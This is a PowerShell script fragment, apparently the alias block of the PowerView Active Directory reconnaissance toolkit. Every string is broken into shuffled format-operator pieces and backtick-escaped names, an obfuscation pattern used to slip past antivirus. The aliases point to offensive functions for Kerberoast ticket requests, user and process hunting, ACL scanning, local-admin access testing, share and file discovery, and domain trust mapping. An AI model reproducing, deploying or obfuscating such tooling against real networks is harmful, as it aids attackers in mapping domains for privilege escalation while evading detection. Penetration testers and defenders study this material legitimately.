${NETAp`i`32} = ${T`Y`PEs}[("{0}{1}"-f'netap','i32')]
${advA`pi`32} = ${Typ`ES}[("{1}{0}"-f 'dvapi32','a')]
${WTsa`p`I32} = ${TYP`ES}[("{0}{1}{2}"-f 'w','tsapi3','2')]
${m`Pr} = ${t`yP`Es}['Mpr']
${K`eRN`el32} = ${t`Y`Pes}[("{0}{1}"-f 'kern','el32')]

&("{2}{1}{0}"-f'as','t-Ali','Se') ("{3}{0}{1}{2}" -f 't','-IPA','ddress','Ge') ("{0}{1}{2}{4}{3}"-f'Re','so','lve','ress','-IPAdd')
&("{2}{1}{0}" -f'ias','Al','Set-') ("{0}{4}{1}{3}{2}" -f'Con','-','Sid','NameTo','vert') ("{4}{0}{2}{3}{1}"-f've','ID','rt','To-S','Con')
&("{2}{0}{1}"-f'-Alia','s','Set') ("{2}{0}{1}{3}"-f'vert','-SidToNa','Con','me') ("{2}{1}{0}"-f 'SID','rom-','ConvertF')
&("{2}{0}{1}" -f'e','t-Alias','S') ("{3}{2}{1}{4}{0}"-f'et','t-SPN','ques','Re','Tick') ("{2}{3}{0}{1}{4}"-f 'NT','icke','Get-D','omainSP','t')
&("{1}{0}{2}" -f 'et-Ali','S','as') ("{2}{0}{1}" -f't-DNS','Zone','Ge') ("{0}{3}{2}{1}" -f 'Ge','one','NSZ','t-DomainD')
&("{2}{1}{0}"-f'ias','l','Set-A') ("{2}{1}{0}"-f 'ord','SRec','Get-DN') ("{0}{2}{3}{1}"-f'Get-D','rd','oma','inDNSReco')
&("{0}{1}{2}" -f'Se','t-','Alias') ("{1}{4}{2}{0}{3}"-f'o','Get','tD','main','-Ne') ("{1}{2}{0}"-f't-Domain','G','e')
&("{1}{0}{2}" -f 'A','Set-','lias') ("{3}{4}{1}{2}{6}{0}{5}{7}" -f'D','N','e','G','et-','omainCont','t','roller') ("{2}{1}{3}{0}" -f'roller','ainCo','Get-Dom','nt')
&("{1}{0}{2}" -f'et-Ali','S','as') ("{0}{3}{2}{1}"-f'Ge','est','r','t-NetFo') ("{2}{3}{1}{0}"-f 'orest','-F','G','et')
&("{0}{2}{1}" -f'Se','ias','t-Al') ("{2}{5}{0}{3}{1}{4}" -f'or','m','Get-Net','estDo','ain','F') ("{2}{1}{0}" -f'in','restDoma','Get-Fo')
&("{2}{1}{3}{0}"-f 's','et-Ali','S','a') ("{1}{5}{4}{3}{2}{0}"-f 'alog','Get-NetFore','at','C','t','s') ("{3}{2}{5}{0}{4}{1}{6}"-f'st','b','-','Get','Glo','Fore','alCatalog')
&("{2}{1}{0}"-f 's','-Alia','Set') ("{3}{0}{1}{2}" -f'et-Net','Use','r','G') ("{1}{2}{0}{3}" -f 'nUs','Get-Doma','i','er')
&("{0}{1}" -f 'Set-Ali','as') ("{3}{2}{1}{0}" -f 't','en','t-UserEv','Ge') ("{3}{0}{4}{1}{2}"-f 'om','inUserEven','t','Get-D','a')
&("{0}{1}{2}"-f 'Set-A','l','ias') ("{3}{0}{1}{2}" -f 'p','ut','er','Get-NetCom') ("{3}{0}{1}{2}"-f'et-Doma','inCo','mputer','G')
&("{1}{2}{0}"-f's','Set-A','lia') ("{0}{2}{3}{1}" -f'Get-A','ject','DO','b') ("{1}{0}{3}{2}"-f 'omainO','Get-D','ect','bj')
&("{2}{0}{1}{3}"-f'et-A','li','S','as') ("{1}{0}{2}"-f'et-ADObjec','S','t') ("{2}{1}{3}{0}" -f'ect','b','Set-DomainO','j')
&("{3}{1}{2}{0}" -f'lias','et','-A','S') ("{0}{2}{1}"-f'Get-Objec','Acl','t') ("{0}{4}{1}{2}{3}{5}"-f 'Get-','omainObje','ct','Ac','D','l')
&("{1}{0}{2}" -f 'et-Alia','S','s') ("{4}{0}{1}{3}{2}"-f '-Obj','ec','Acl','t','Add') ("{0}{5}{4}{2}{1}{3}"-f'Add-D','je','b','ctAcl','ainO','om')
&("{1}{0}{2}" -f 't-Al','Se','ias') ("{1}{2}{3}{0}" -f'er','Invoke','-ACLSca','nn') ("{3}{1}{0}{2}{4}"-f 'nt','-I','eres','Find','tingDomainAcl')
&("{2}{0}{1}"-f 'e','t-Alias','S') ("{3}{1}{2}{0}" -f'ap','UI','DM','Get-G') ("{0}{1}{2}{4}{3}" -f 'Get-D','omain','GUID','p','Ma')
&("{1}{0}"-f 'as','Set-Ali') ("{2}{0}{1}" -f'O','U','Get-Net') ("{1}{2}{0}{3}"-f '-DomainO','Ge','t','U')
&("{0}{2}{1}"-f 'S','lias','et-A') ("{0}{3}{1}{2}" -f'G','tSit','e','et-Ne') ("{4}{3}{1}{2}{0}"-f'ite','ma','inS','-Do','Get')
&("{0}{1}" -f'Set-Ali','as') ("{0}{4}{1}{2}{3}" -f 'Get','ub','ne','t','-NetS') ("{0}{3}{1}{2}"-f'Ge','-Doma','inSubnet','t')
&("{2}{0}{1}"-f 'Alia','s','Set-') ("{0}{2}{1}"-f 'Ge','-NetGroup','t') ("{2}{3}{1}{4}{0}"-f'p','G','Get-Doma','in','rou')
&("{2}{1}{0}"-f'ias','l','Set-A') ("{1}{3}{5}{2}{0}{4}"-f'SecurityGr','Fin','Managed','d','oups','-') ("{7}{8}{2}{5}{9}{3}{4}{6}{0}{1}"-f'G','roup','t-','gedSe','cur','Domain','ity','G','e','Mana')
&("{0}{1}{2}" -f 'S','e','t-Alias') ("{1}{0}{2}{3}"-f'rou','Get-NetG','pMemb','er') ("{4}{1}{2}{0}{3}"-f 'emb','omainGroup','M','er','Get-D')
&("{0}{2}{1}"-f'Se','Alias','t-') ("{2}{4}{1}{3}{0}"-f'r','leS','Get-N','erve','etFi') ("{2}{0}{3}{1}{4}" -f 't-Do','Serve','Ge','mainFile','r')
&("{2}{0}{1}"-f 'et-Ali','as','S') ("{0}{1}{2}{3}"-f'Get-','DF','Ss','hare') ("{0}{3}{2}{1}"-f 'Get-Domain','hare','FSS','D')
&("{2}{1}{0}"-f 'Alias','-','Set') ("{0}{1}{2}{3}" -f'Ge','t-Net','G','PO') ("{0}{3}{1}{2}"-f 'Ge','omai','nGPO','t-D')
&("{1}{0}{2}" -f 'Ali','Set-','as') ("{3}{0}{2}{4}{1}" -f'et-Net','up','G','G','POGro') ("{1}{3}{2}{4}{5}{0}"-f'up','Get-D','ma','o','in','GPOLocalGro')
&("{2}{0}{1}"-f 't-A','lias','Se') ("{2}{1}{4}{0}{3}"-f'OLoc','G','Find-','ation','P') ("{2}{0}{4}{7}{1}{3}{6}{5}"-f 'D','GPOUse','Get-','rL','omai','ing','ocalGroupMapp','n')
&("{3}{2}{1}{0}" -f's','Alia','-','Set') ("{2}{1}{0}{3}{4}" -f'ComputerAd','O','Find-GP','mi','n') ("{2}{7}{5}{1}{4}{8}{0}{6}{3}"-f 'Map','erLocal','G','ng','G','Comput','pi','et-DomainGPO','roup')
&("{1}{0}{2}"-f't-Ali','Se','as') ("{3}{2}{4}{1}{0}" -f'ocal','L','gedO','Get-Log','n') ("{0}{4}{2}{3}{1}" -f'Ge','edOn','g','g','t-RegLo')
&("{1}{0}{2}" -f 'Ali','Set-','as') ("{2}{1}{0}{4}{5}{3}" -f'eckLoc','h','Invoke-C','cess','alAdminA','c') ("{4}{0}{2}{1}{3}" -f 'e','dminAc','st-A','cess','T')
&("{0}{2}{1}" -f 'Set-A','s','lia') ("{2}{1}{0}"-f'e','t-SiteNam','Ge') ("{2}{3}{1}{4}{0}"-f 'me','terSi','Get-','NetCompu','teNa')
&("{1}{2}{0}"-f 'lias','Set','-A') ("{0}{1}{2}" -f 'Get','-Pr','oxy') ("{3}{2}{1}{0}"-f 'xy','gPro','e','Get-WMIR')
&("{1}{0}{2}" -f 'a','Set-Ali','s') ("{3}{0}{1}{2}"-f '-L','a','stLoggedOn','Get') ("{4}{0}{3}{2}{1}{5}{6}" -f'MIR','tLo','Las','eg','Get-W','ggedO','n')
&("{1}{0}{2}" -f 't-Alia','Se','s') ("{4}{3}{1}{2}{0}" -f'ection','n','n','DPCo','Get-CachedR') ("{8}{2}{7}{6}{3}{4}{1}{5}{0}" -f 'nnection','R','W','Cach','ed','DPCo','IReg','M','Get-')
&("{0}{1}" -f 'Se','t-Alias') ("{2}{4}{6}{1}{5}{3}{0}" -f'ive','ryM','Get-R','tedDr','e','oun','gist') ("{3}{4}{0}{2}{1}"-f 'g','ountedDrive','M','Get-','WMIRe')
&("{0}{2}{1}" -f 'Set-Ali','s','a') ("{0}{1}{3}{2}" -f'Get-N','et','s','Proces') ("{0}{2}{1}"-f 'Get-W','Process','MI')
&("{1}{0}" -f '-Alias','Set') ("{5}{0}{2}{3}{6}{1}{4}"-f'Thr','t','eadedF','un','ion','Invoke-','c') NE`W-T`hrEAD`e`dFuNC`TiON
&("{0}{2}{3}{1}" -f'Set-','as','Al','i') ("{4}{3}{5}{1}{0}{2}"-f'rHunt','se','er','voke-','In','U') ("{3}{0}{5}{4}{2}{1}{6}"-f'i','Locatio','er','F','ainUs','nd-Dom','n')
&("{1}{0}{2}"-f '-Al','Set','ias') ("{5}{0}{1}{2}{3}{4}"-f '-Proc','e','s','sHunt','er','Invoke') ("{2}{0}{1}{3}{5}{4}"-f'P','r','Find-Domain','o','ss','ce')
&("{2}{1}{0}" -f'as','i','Set-Al') ("{0}{1}{2}{3}"-f 'Invok','e','-Eve','ntHunter') ("{3}{5}{2}{4}{6}{0}{1}"-f 'Even','t','m','F','ai','ind-Do','nUser')
&("{0}{1}{2}" -f 'Set-Ali','a','s') ("{2}{1}{4}{0}{3}{5}" -f'Fi','-Sha','Invoke','nd','re','er') ("{0}{1}{3}{2}" -f'Find','-DomainS','re','ha')
&("{0}{2}{1}"-f 'Set-','ias','Al') ("{4}{2}{1}{3}{0}" -f'r','Fi','le','nde','Invoke-Fi') ("{0}{2}{7}{4}{5}{3}{1}{6}"-f'Find-','ShareF','Intere','ain','ngDo','m','ile','sti')
&("{2}{0}{1}" -f 'et','-Alias','S') ("{4}{1}{3}{2}{0}{5}" -f'lA','nvoke-E','ca','numerateLo','I','dmin') ("{0}{2}{1}{5}{4}{3}" -f 'Find-DomainLoc','lGr','a','ber','pMem','ou')
&("{1}{3}{0}{2}"-f'-A','S','lias','et') ("{0}{2}{1}{3}"-f'Get-NetD','ainTrus','om','t') ("{2}{3}{0}{1}{4}" -f'u','s','Get-','DomainTr','t')
&("{2}{1}{0}"-f 'as','et-Ali','S') ("{1}{3}{0}{2}" -f 'ForestTru','Get-','st','Net') ("{3}{2}{0}{1}"-f 'stTrus','t','ore','Get-F')
&("{0}{1}{2}"-f'S','et-Ali','as') ("{2}{0}{3}{4}{1}" -f'n','gnUser','Fi','d-Fore','i') ("{0}{6}{5}{2}{1}{4}{3}"-f'G','reig','omainFo','er','nUs','t-D','e')
&("{1}{0}{2}" -f 'et-A','S','lias') ("{1}{3}{2}{0}{4}" -f 'gnGro','Find-','i','Fore','up') ("{2}{4}{3}{1}{0}" -f 'ber','oupMem','Get-','ForeignGr','Domain')
&("{2}{1}{0}" -f 'as','et-Ali','S') ("{3}{2}{0}{4}{1}"-f'oke-MapDomain','rust','v','In','T') ("{0}{4}{3}{2}{1}{6}{5}" -f'G','Trus','ain','t-Dom','e','ng','tMappi')
&("{0}{1}" -f 'Set','-Alias') ("{0}{1}{4}{2}{3}" -f 'Ge','t-D','ai','nPolicy','om') ("{0}{2}{1}{3}" -f'Ge','lic','t-DomainPo','yData')